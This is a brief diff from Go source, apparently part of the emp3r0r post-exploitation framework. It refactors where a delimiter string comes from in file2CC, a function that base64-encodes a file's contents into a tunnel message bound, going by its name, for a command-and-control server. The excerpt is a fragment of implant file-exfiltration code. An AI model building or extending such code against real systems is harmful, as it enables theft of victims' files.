@@ -36,7 +36,7 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
 	fileData := emp3r0r_data.MsgTunData{
-		Payload: "FILE" + RuntimeConfig.MagicString + filepath + RuntimeConfig.MagicString + payload,
+		Payload: "FILE" + emp3r0r_data.MagicString + filepath + emp3r0r_data.MagicString + payload,
 		Tag:     RuntimeConfig.AgentTag,
 	}
 
